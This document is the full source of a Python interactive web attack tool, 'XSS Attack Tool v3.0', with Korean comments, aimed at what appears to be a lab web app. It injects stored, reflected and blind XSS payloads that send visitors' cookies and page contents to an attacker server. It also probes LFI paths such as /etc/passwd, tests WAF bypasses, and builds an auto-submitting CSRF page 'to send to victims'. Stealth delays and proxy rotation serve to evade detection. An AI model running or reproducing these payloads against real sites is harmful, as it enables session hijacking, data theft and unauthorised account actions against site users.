#!/usr/bin/env python3
"""
XSS Attack Tool v3.0 - Interactive Mode with Stealth Support
Educational purposes only!
"""

import requests
from bs4 import BeautifulSoup
import time
import json
import re
from datetime import datetime
import random
import base64
import os
import sys
import argparse
import platform
from urllib.parse import urlparse, parse_qs, urlencode
import threading
from colorama import init, Fore, Back, Style
import socks
import socket
# from stem import Signal
# from stem.control import Controller


# Initialize colorama for colored output
init(autoreset=True)

class XSSAttackToolV3:
    def __init__(self, target_url, attacker_server, use_proxy=False,stealth_mode=False, proxy_port=None):
        self.target_url = target_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.use_proxy = use_proxy
        self.logged_in = False
        self.stealth_mode = stealth_mode
        self.proxy_port = proxy_port
        self.vulnerabilities = []
        self.successful_payloads = []
        
        # User-Agent pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1.2',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Firefox/89.0'
        ]
        
        # Setup
        self.setup_session()
        if use_proxy:
            self.setup_proxy_list()
        elif proxy_port:
            self.setup_proxy(proxy_port)

    def setup_session(self):
        """세션 설정"""
        self.session = requests.Session() # 세션 초기화
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',  # 한국어 우선
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })

    def setup_proxy_list(self):
        """프록시 리스트 설정"""
        self.proxy_list = [
            # 'http://proxy1.com:8080',
            # 'http://proxy2.com:3128',
            # # 실제 작동하는 프록시로 교체 필요
            'http://3.38.101.138:48293'
        ]
        self.current_proxy = 0
        
        # 첫 번째 프록시로 시작
        self.rotate_proxy()

    def rotate_proxy(self):
        """프록시 로테이션"""
        if not hasattr(self, 'proxy_list') or not self.proxy_list:
            print(f"{Fore.YELLOW}[!] No proxies available{Style.RESET_ALL}")
            return False
        
        proxy = self.proxy_list[self.current_proxy % len(self.proxy_list)]
        self.current_proxy += 1
        
        self.session.proxies = {
            'http': proxy,
            'https': proxy
        }
        
        # IP 확인
        try:
            ip_check = self.session.get('https://api.ipify.org', timeout=10).text
            print(f"{Fore.GREEN}[+] Using proxy. Current IP: {ip_check}{Style.RESET_ALL}")
            return True
        except:
            print(f"{Fore.YELLOW}[!] Proxy {proxy} failed, trying next...{Style.RESET_ALL}")
            if self.current_proxy < len(self.proxy_list):
                return self.rotate_proxy()
            return False

    def setup_proxy(self, port):
        """일반 프록시 설정 (Tor 아닌 경우)"""
        try:
            self.session.proxies = {
                'http': f'socks5://localhost:{port}',
                'https': f'socks5://localhost:{port}'
            }
            print(f"{Fore.GREEN}[+] Proxy configured on port {port}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Proxy setup failed: {e}{Style.RESET_ALL}")

    def get_new_proxy(self):
        """새로운 프록시로 변경"""
        if not self.use_proxy:
            print(f"{Fore.YELLOW}[!] Proxy rotation is not enabled{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}[*] Rotating to new proxy...{Style.RESET_ALL}")
        
        if self.rotate_proxy():
            print(f"{Fore.GREEN}[+] Proxy rotated successfully{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Proxy rotation failed{Style.RESET_ALL}")

    def make_request(self, url, method='GET', max_retries=3, ignore_403=False, **kwargs):
        """403 처리가 포함된 공통 요청 함수"""
        for attempt in range(max_retries):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, **kwargs)
                elif method.upper() == 'POST':
                    response = self.session.post(url, **kwargs)
                else:
                    response = self.session.request(method, url, **kwargs)
                
                # 403 처리
                if response.status_code == 403 and not ignore_403:
                    print(f"{Fore.RED}[-] Blocked (403) - Attempt {attempt + 1}/{max_retries}{Style.RESET_ALL}")
                    
                    if self.use_proxy and attempt < max_retries - 1:
                        print(f"{Fore.YELLOW}[*] Getting new proxy...{Style.RESET_ALL}")
                        self.get_new_proxy()
                        self.smart_delay()
                        continue
                    else:
                        return response
                
                return response
                
            except Exception as e:
                print(f"{Fore.RED}[-] Request error: {e}{Style.RESET_ALL}")
                if attempt < max_retries - 1:
                    if self.use_proxy:
                        self.get_new_proxy()
                    time.sleep(5)
                else:
                    raise
        
        return None

    def smart_delay(self):
        """스텔스 모드 딜레이"""
        if self.stealth_mode:
            delay = random.uniform(5, 15)
            time.sleep(delay)
        else:
            time.sleep(random.uniform(0.5, 2))

    def print_banner(self):
        """배너 출력"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║               XSS Attack Tool v3.0 - Interactive Mode        ║
║                    Educational Purpose Only!                  ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Target:{Style.RESET_ALL} {self.target_url}
{Fore.YELLOW}Attacker Server:{Style.RESET_ALL} {self.attacker_server}
{Fore.YELLOW}Stealth Mode:{Style.RESET_ALL} {'ON' if self.stealth_mode else 'OFF'}
{Fore.YELLOW}Proxy Rotation:{Style.RESET_ALL} {'ON' if self.use_proxy else 'OFF'}
{Fore.YELLOW}Single Proxy:{Style.RESET_ALL} {'Port ' + str(self.proxy_port) if self.proxy_port and not self.use_proxy else 'N/A'}
"""
        print(banner)

        

    def login(self, username="bob", password="bobby123"):
        """로그인"""
        print(f"\n{Fore.YELLOW}[*] Attempting login with {username}/{password}...{Style.RESET_ALL}")
        
        login_url = f"{self.target_url}/login.php"
        
        # 정상적인 로그인 페이지 방문
        # 기존: self.session.get(login_url)
        # response = self.make_request(login_url, method='GET')  # 수정
        # if response:
        #     print(f"[DEBUG] Login page status: {response.status_code}")
        # self.smart_delay()

        data = {'username': username, 'password': password}
        
        try:
            # 기존: response = self.session.post(login_url, data=data, allow_redirects=True)
            response = self.make_request(login_url, method='POST', data=data, allow_redirects=True)  # 수정
            
            if response:
                print(f"[DEBUG] Login response status: {response.status_code}")
                print(f"[DEBUG] Response URL: {response.url}")
                
                # 쿠키 확인
                print(f"[DEBUG] Cookies: {self.session.cookies.get_dict()}")

                # index.php로 리다이렉트 확인
                if 'index.php' in response.url or response.status_code == 200:
                    # 실제로 로그인되었는지 확인
                    check_response = self.make_request(f"{self.target_url}/index.php", method='GET')
                    if check_response and ("logout" in check_response.text.lower() or username in check_response.text):
                        print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
                        self.logged_in = True
                        return True
                
                # 에러 메시지 확인
                if "error" in response.text.lower() or "fail" in response.text.lower():
                    print(f"{Fore.RED}[-] Login failed: Invalid credentials{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[-] Login error: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.RED}[-] Login failed!{Style.RESET_ALL}")
        return False

    def show_menu(self):
        """인터랙티브 메뉴"""
        menu = f"""
{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
{Fore.GREEN}Available Commands:{Style.RESET_ALL}

{Fore.YELLOW}[1]{Style.RESET_ALL} Basic XSS Test              - Test common XSS payloads
{Fore.YELLOW}[2]{Style.RESET_ALL} GET Parameter Scan          - Find XSS in GET parameters  
{Fore.YELLOW}[3]{Style.RESET_ALL} File.php Exploitation       - Test file.php vulnerabilities
{Fore.YELLOW}[4]{Style.RESET_ALL} WAF Detection               - Detect WAF patterns
{Fore.YELLOW}[5]{Style.RESET_ALL} Advanced Encoding Bypass    - Try encoded payloads
{Fore.YELLOW}[6]{Style.RESET_ALL} Cookie Stealer              - Deploy cookie stealing payload
{Fore.YELLOW}[7]{Style.RESET_ALL} DOM XSS Finder             - Find DOM-based XSS
{Fore.YELLOW}[8]{Style.RESET_ALL} CSRF PoC Generator         - Generate CSRF attack page
{Fore.YELLOW}[9]{Style.RESET_ALL} Custom Payload             - Test your own payload
{Fore.YELLOW}[10]{Style.RESET_ALL} Reflected XSS Scanner     - Scan for reflected XSS
{Fore.YELLOW}[11]{Style.RESET_ALL} Blind XSS Payload         - Deploy blind XSS beacon
{Fore.YELLOW}[12]{Style.RESET_ALL} Generate Report           - Create attack report

{Fore.MAGENTA}[P]{Style.RESET_ALL} Rotate Proxy               - Switch to next proxy
{Fore.MAGENTA}[S]{Style.RESET_ALL} Toggle Stealth Mode        - Current: {'ON' if self.stealth_mode else 'OFF'}
{Fore.MAGENTA}[H]{Style.RESET_ALL} Help                      - Show detailed help
{Fore.RED}[Q]{Style.RESET_ALL} Quit                      - Exit the tool

{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""
        print(menu)

    def basic_xss_test(self):
        """기본 XSS 테스트"""
        print(f"\n{Fore.CYAN}[*] Running Basic XSS Test...{Style.RESET_ALL}")
        
        payloads = [
            # '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '" onmouseover="alert(1)" x="',
            "' onmouseover='alert(1)' x='",
            'javascript:alert(1)',
            # '<iframe src=javascript:alert(1)>'
        ]
        
        for payload in payloads:
            print(f"\n{Fore.YELLOW}Testing:{Style.RESET_ALL} {payload[:50]}...")
            
            # POST 테스트
            # 기존: response = self.session.post(f"{self.target_url}/new_post.php", data={'content': payload})
            response = self.make_request(
                f"{self.target_url}/new_post.php",
                method='POST',
                data={'content': payload}
            )  # 수정
            
            if response is None:
                print(f"{Fore.RED}[-] Request failed{Style.RESET_ALL}")
                continue
                
            if response.status_code == 403:
                print(f"{Fore.RED}[-] Blocked by WAF (403){Style.RESET_ALL}")
            elif response.status_code == 200:
                # 주입 확인
                # 기존: check = self.session.get(f"{self.target_url}/index.php")
                check = self.make_request(f"{self.target_url}/index.php", method='GET')  # 수정
                
                if check and payload in check.text:
                    print(f"{Fore.GREEN}[+] XSS FOUND! Payload injected successfully{Style.RESET_ALL}")
                    self.successful_payloads.append(payload)
                else:
                    print(f"{Fore.YELLOW}[*] Payload filtered or encoded{Style.RESET_ALL}")
            
            self.smart_delay()

    def get_parameter_scan(self):
        """GET 파라미터 XSS 스캔"""
        print(f"\n{Fore.CYAN}[*] Scanning GET Parameters...{Style.RESET_ALL}")
        
        # 일반적인 GET 엔드포인트
        endpoints = [
            '/file.php?name=',
        ]
        
        test_payload = '<img src=x onerror=alert(1)>'
        
        for endpoint in endpoints:
            url = f"{self.target_url}{endpoint}{test_payload}"
            print(f"\n{Fore.YELLOW}Testing:{Style.RESET_ALL} {endpoint}")
            
            try:
                # 기존: response = self.session.get(url)
                response = self.make_request(url, method='GET')  # 수정
                
                if response is None:
                    continue
                    
                if test_payload in response.text:
                    print(f"{Fore.GREEN}[+] XSS FOUND at {endpoint}{Style.RESET_ALL}")
                    self.vulnerabilities.append({
                        'type': 'GET XSS',
                        'endpoint': endpoint
                    })
                elif response.status_code == 403:
                    print(f"{Fore.RED}[-] Blocked by WAF{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[-] Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            
            self.smart_delay()

    def file_php_exploit(self):
        """file.php 취약점 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing file.php vulnerabilities...{Style.RESET_ALL}")
        
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            '/var/log/apache2/access.log'
        ]
        
        for payload in lfi_payloads:
            url = f"{self.target_url}/file.php?name={payload}"
            print(f"\n{Fore.YELLOW}Testing LFI:{Style.RESET_ALL} {payload}")
            
            try:
                # 기존: response = self.session.get(url)
                response = self.make_request(url, method='GET')  # 수정
                
                if response is None:
                    continue
                    
                if 'root:' in response.text or 'www-data:' in response.text:
                    print(f"{Fore.GREEN}[+] LFI FOUND! System file accessible{Style.RESET_ALL}")
                    self.vulnerabilities.append({
                        'type': 'LFI',
                        'payload': payload
                    })
                elif response.status_code == 200 and len(response.text) > 500:
                    print(f"{Fore.YELLOW}[*] Possible LFI - check response{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            
            self.smart_delay()

    def waf_detection(self):
        """WAF 패턴 감지"""
        print(f"\n{Fore.CYAN}[*] Detecting WAF patterns...{Style.RESET_ALL}")
        
        test_strings = [
            'normal text',
            '<script>',
            'alert(1)',
            'onerror=',
            'javascript:',
            '<img',
            'onmouseover',
            '../../../',
            'SELECT * FROM',
            '<?php'
        ]
        
        blocked = []
        allowed = []
        
        for test in test_strings:
            # 기존: response = self.session.post(f"{self.target_url}/new_post.php", data={'content': test})
            response = self.make_request(
                f"{self.target_url}/new_post.php",
                method='POST',
                data={'content': test}
            )  # 수정
            
            if response is None:
                continue
                
            if response.status_code == 403:
                blocked.append(test)
                print(f"{Fore.RED}[-] BLOCKED: {test}{Style.RESET_ALL}")
            else:
                allowed.append(test)
                print(f"{Fore.GREEN}[+] ALLOWED: {test}{Style.RESET_ALL}")
            
            self.smart_delay()
        
        print(f"\n{Fore.YELLOW}Summary:{Style.RESET_ALL}")
        print(f"Blocked patterns: {blocked}")
        print(f"Allowed patterns: {allowed}")

    def advanced_encoding_bypass(self):
        """고급 인코딩 우회"""
        print(f"\n{Fore.CYAN}[*] Testing advanced encoding bypasses...{Style.RESET_ALL}")
        
        base_payload = "alert(1)"
        
        encodings = {
            'HTML Entity': '&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
            'URL Encode': '%61%6c%65%72%74%28%31%29',
            'Unicode': '\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029',
            'Base64': 'YWxlcnQoMSk=',
            'Hex': '0x616c6572742831290'
        }
        
        for name, encoded in encodings.items():
            print(f"\n{Fore.YELLOW}Testing {name}:{Style.RESET_ALL} {encoded}")
            
            payloads = [
                f'<img src=x onerror="{encoded}">',
                f'<script>{encoded}</script>',
                f'" onmouseover="{encoded}" x="'
            ]
            
            for payload in payloads:
                response = self.session.post(
                    f"{self.target_url}/new_post.php",
                    data={'content': payload}
                )
                
                if response.status_code != 403:
                    print(f"{Fore.GREEN}[+] Bypass successful with {name}{Style.RESET_ALL}")
                    break
                
                self.smart_delay()

    def cookie_stealer(self):
        """쿠키 스틸러 배포"""
        print(f"\n{Fore.CYAN}[*] Deploying cookie stealer...{Style.RESET_ALL}")
        
        payloads = [
            f'<img src=x onerror="new Image().src=\'{self.attacker_server}/steal?c=\'+document.cookie">',
            f'<script>location=\'{self.attacker_server}/steal?c=\'+document.cookie</script>',
            f'" onmouseover="location=\'{self.attacker_server}/steal?c=\'+document.cookie" x="',
            f'<script>fetch(\'{self.attacker_server}/steal\',{{method:\'POST\',body:document.cookie}})</script>'
        ]
        
        for i, payload in enumerate(payloads):
            print(f"\n{Fore.YELLOW}Trying payload {i+1}...{Style.RESET_ALL}")
            
            response = self.session.post(
                f"{self.target_url}/new_post.php",
                data={'content': payload}
            )
            
            if response.status_code != 403:
                print(f"{Fore.GREEN}[+] Cookie stealer deployed!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Payload:{Style.RESET_ALL} {payload[:100]}...")
                print(f"{Fore.CYAN}Check your attacker server at {self.attacker_server}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}[-] Blocked by WAF{Style.RESET_ALL}")
            
            self.smart_delay()
        
        print(f"{Fore.RED}[-] All cookie stealer payloads blocked{Style.RESET_ALL}")
        return False

    def dom_xss_finder(self):
        """DOM XSS 찾기"""
        print(f"\n{Fore.CYAN}[*] Searching for DOM XSS vulnerabilities...{Style.RESET_ALL}")
        
        # 메인 페이지 분석
        response = self.session.get(f"{self.target_url}/index.php")
        
        # 위험한 JavaScript 패턴 찾기
        dangerous_patterns = [
            (r'location\.hash', 'location.hash usage'),
            (r'document\.write', 'document.write usage'),
            (r'innerHTML\s*=', 'innerHTML assignment'),
            (r'eval\(', 'eval() function'),
            (r'setTimeout\(', 'setTimeout with string'),
            (r'\.html\(', 'jQuery html() method'),
            (r'\.append\(', 'jQuery append() method')
        ]
        
        found = False
        for pattern, description in dangerous_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                print(f"{Fore.GREEN}[+] Found {description}{Style.RESET_ALL}")
                found = True
        
        if found:
            print(f"\n{Fore.YELLOW}DOM XSS test URLs:{Style.RESET_ALL}")
            print(f"{self.target_url}#<img src=x onerror=alert(1)>")
            print(f"{self.target_url}#javascript:alert(1)")
            print(f"{self.target_url}?q=<script>alert(1)</script>")
        else:
            print(f"{Fore.RED}[-] No obvious DOM XSS patterns found{Style.RESET_ALL}")

    def csrf_poc_generator(self):
        """CSRF PoC 생성"""
        print(f"\n{Fore.CYAN}[*] Generating CSRF PoC...{Style.RESET_ALL}")
        
        csrf_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {self.target_url}</title>
    <meta charset="utf-8">
</head>
<body onload="document.forms[0].submit()">
    <h1>CSRF Proof of Concept</h1>
    
    <!-- Auto-submit form -->
    <form action="{self.target_url}/transfer_points.php" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="1000">
    </form>
    
    <!-- GET-based attacks -->
    <img src="{self.target_url}/delete_post.php?id=1" style="display:none">
    <img src="{self.target_url}/change_password.php?new=hacked123" style="display:none">
    
    <!-- XSS attempts via GET -->
    <img src="{self.target_url}/search.php?q=<script>alert(1)</script>" style="display:none">
    
    <script>
        // Additional attacks
        var img = new Image();
        img.src = '{self.target_url}/logout.php';
        
        // Redirect after 2 seconds
        setTimeout(function() {{
            window.location = '{self.target_url}';
        }}, 2000);
    </script>
</body>
</html>"""
        
        filename = f"csrf_poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w') as f:
            f.write(csrf_html)
        
        print(f"{Fore.GREEN}[+] CSRF PoC saved as {filename}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Host this file and send the link to victims{Style.RESET_ALL}")

    def custom_payload_test(self):
        """사용자 정의 페이로드 테스트"""
        print(f"\n{Fore.CYAN}[*] Custom Payload Test{Style.RESET_ALL}")
        
        payload = input(f"{Fore.YELLOW}Enter your payload: {Style.RESET_ALL}")
        
        if not payload:
            print(f"{Fore.RED}[-] No payload entered{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Testing payload...{Style.RESET_ALL}")
        
        # POST 테스트
        response = self.session.post(
            f"{self.target_url}/new_post.php",
            data={'content': payload}
        )
        
        print(f"Response Code: {response.status_code}")
        
        if response.status_code == 403:
            print(f"{Fore.RED}[-] Blocked by WAF{Style.RESET_ALL}")
        elif response.status_code == 200:
            print(f"{Fore.GREEN}[+] Payload accepted{Style.RESET_ALL}")
            
            # GET 테스트도 해보기
            test_url = f"{self.target_url}/search.php?q={payload}"
            print(f"\n{Fore.YELLOW}Also testing GET:{Style.RESET_ALL} {test_url[:100]}...")
            
            get_response = self.session.get(test_url)
            if payload in get_response.text:
                print(f"{Fore.GREEN}[+] GET XSS successful!{Style.RESET_ALL}")

    def reflected_xss_scanner(self):
        """반사형 XSS 스캐너"""
        print(f"\n{Fore.CYAN}[*] Scanning for Reflected XSS...{Style.RESET_ALL}")
        
        # 페이지에서 모든 폼과 링크 수집
        response = self.session.get(f"{self.target_url}/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 폼 찾기
        forms = soup.find_all('form')
        print(f"Found {len(forms)} forms")
        
        test_payload = '"><script>alert(1)</script>'
        
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            print(f"\n{Fore.YELLOW}Testing form: {action}{Style.RESET_ALL}")
            
            for input_field in inputs:
                name = input_field.get('name', '')
                if name and input_field.get('type') != 'submit':
                    if method == 'get':
                        test_url = f"{self.target_url}/{action}?{name}={test_payload}"
                        response = self.session.get(test_url)
                        
                        if test_payload in response.text:
                            print(f"{Fore.GREEN}[+] Reflected XSS in {name}!{Style.RESET_ALL}")
                            self.vulnerabilities.append({
                                'type': 'Reflected XSS',
                                'parameter': name,
                                'form': action
                            })
            
            self.smart_delay()

    def blind_xss_payload(self):
        """Blind XSS 페이로드"""
        print(f"\n{Fore.CYAN}[*] Deploying Blind XSS payloads...{Style.RESET_ALL}")
        
        blind_payloads = [
            f'<script src="{self.attacker_server}/blind.js"></script>',
            f'"><script src="{self.attacker_server}/blind.js"></script>',
            f'<img src=x onerror="s=document.createElement(\'script\');s.src=\'{self.attacker_server}/blind.js\';document.body.appendChild(s)">',
            f'<svg onload="fetch(\'{self.attacker_server}/blind\',{{method:\'POST\',body:JSON.stringify({{url:location.href,cookies:document.cookie,html:document.documentElement.outerHTML}})}})">',
        ]
        
        # 다양한 위치에 주입
        locations = [
            ('Contact Form', '/contact.php', 'message'),
            ('Profile Bio', '/profile.php', 'bio'),
            ('Comment', '/comment.php', 'comment'),
            ('Feedback', '/feedback.php', 'feedback')
        ]
        
        for location_name, endpoint, param in locations:
            print(f"\n{Fore.YELLOW}Testing {location_name}...{Style.RESET_ALL}")
            
            for payload in blind_payloads:
                data = {param: payload}
                response = self.session.post(f"{self.target_url}{endpoint}", data=data)
                
                if response.status_code != 403:
                    print(f"{Fore.GREEN}[+] Blind XSS payload injected in {location_name}{Style.RESET_ALL}")
                    break
            
            self.smart_delay()
        
        print(f"\n{Fore.CYAN}Monitor your attacker server for callbacks!{Style.RESET_ALL}")

    def generate_report(self):
        """공격 리포트 생성"""
        print(f"\n{Fore.CYAN}[*] Generating report...{Style.RESET_ALL}")
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        report = f"""
XSS Attack Report
=================
Generated: {timestamp}
Target: {self.target_url}
Attacker Server: {self.attacker_server}

Successful Payloads ({len(self.successful_payloads)}):
"""
        
        for i, payload in enumerate(self.successful_payloads, 1):
            report += f"{i}. {payload}\n"
        
        report += f"\nVulnerabilities Found ({len(self.vulnerabilities)}):\n"
        
        for vuln in self.vulnerabilities:
            report += f"- Type: {vuln.get('type')}\n"
            for key, value in vuln.items():
                if key != 'type':
                    report += f"  {key}: {value}\n"
            report += "\n"
        
        filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[+] Report saved as {filename}{Style.RESET_ALL}")

    def toggle_stealth(self):
        """스텔스 모드 토글"""
        self.stealth_mode = not self.stealth_mode
        print(f"{Fore.YELLOW}[*] Stealth mode: {'ON' if self.stealth_mode else 'OFF'}{Style.RESET_ALL}")

    def show_help(self):
        """도움말 표시"""
        help_text = f"""
{Fore.CYAN}=== XSS Attack Tool v3.0 Help ==={Style.RESET_ALL}

{Fore.YELLOW}Stealth Mode:{Style.RESET_ALL}
  When enabled, adds random delays between requests to avoid detection.
  Delays range from 5-15 seconds in stealth mode.

{Fore.YELLOW}Proxy Support:{Style.RESET_ALL}
  Use --proxy flag to route traffic through SSH tunnel or SOCKS proxy.
  Example: --proxy 9050

{Fore.YELLOW}Attack Types:{Style.RESET_ALL}
  1. Stored XSS - Payloads saved in database
  2. Reflected XSS - Payloads reflected in response
  3. DOM XSS - Client-side JavaScript vulnerabilities
  4. Blind XSS - No immediate feedback, callbacks to attacker server

{Fore.YELLOW}Tips:{Style.RESET_ALL}
  - Start with WAF detection to understand filtering
  - Try encoded payloads if basic ones are blocked
  - Use GET parameter scan if POST is blocked
  - Deploy blind XSS for admin panels
  - Generate CSRF PoC for social engineering

{Fore.YELLOW}Attacker Server:{Style.RESET_ALL}
  Make sure your attacker server is running and accessible from target.
  It should log all incoming requests for stolen data.
"""
        print(help_text)

    def run(self):
        """메인 실행 루프"""
        self.print_banner()
        
        # 로그인
        if not self.login():
            continue_anyway = input(f"\n{Fore.YELLOW}Continue without login? (y/n): {Style.RESET_ALL}")
            if continue_anyway.lower() != 'y':
                return
        
        # 메인 루프
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}").strip().upper()
            
            if choice == '1':
                self.basic_xss_test()
            elif choice == '2':
                self.get_parameter_scan()
            elif choice == '3':
                self.file_php_exploit()
            elif choice == '4':
                self.waf_detection()
            elif choice == '5':
                self.advanced_encoding_bypass()
            elif choice == '6':
                self.cookie_stealer()
            elif choice == '7':
                self.dom_xss_finder()
            elif choice == '8':
                self.csrf_poc_generator()
            elif choice == '9':
                self.custom_payload_test()
            elif choice == '10':
                self.reflected_xss_scanner()
            elif choice == '11':
                self.blind_xss_payload()
            elif choice == '12':
                self.generate_report()
            elif choice == 'P':
                self.get_new_proxy()
            elif choice == 'S':
                self.toggle_stealth()
            elif choice == 'H':
                self.show_help()
            elif choice == 'Q':
                print(f"\n{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description='XSS Attack Tool v3.0')
    parser.add_argument('target', help='Target URL (e.g., http://vulnerable.com)')
    parser.add_argument('attacker', help='Attacker server URL (e.g., http://attacker.com:5000)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slow requests)')
    parser.add_argument('--proxy', type=int, help='SOCKS proxy port (e.g., 9050 for SSH tunnel)')
    parser.add_argument('--proxy-list', action='store_true', help='Use proxy list rotation')
    
    args = parser.parse_args()
    
    # ASCII Art Banner
    banner = f"""
{Fore.RED}
 __  __ _____ _____   _______          _ 
 \ \/ // ____/ ____| |__   __|        | |
  \  /| (___| (___      | | ___   ___ | |
  /  \ \___ \\\\___ \     | |/ _ \ / _ \| |
 / /\ \____) |___) |    | | (_) | (_) | |
/_/  \_\_____/_____/     |_|\___/ \___/|_|
                                    v3.0
{Style.RESET_ALL}
"""
    print(banner)
    
    # # Tor와 proxy 동시 사용 방지
    # if args.tor and args.proxy:
    #     print(f"{Fore.YELLOW}[!] --tor and --proxy cannot be used together. Using Tor.{Style.RESET_ALL}")
    #     args.proxy = None

    # Tool 초기화
    tool = XSSAttackToolV3(
        target_url=args.target,
        attacker_server=args.attacker,
        stealth_mode=args.stealth,
        proxy_port=args.proxy,
        use_proxy=args.proxy_list
    )
    
    try:
        tool.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()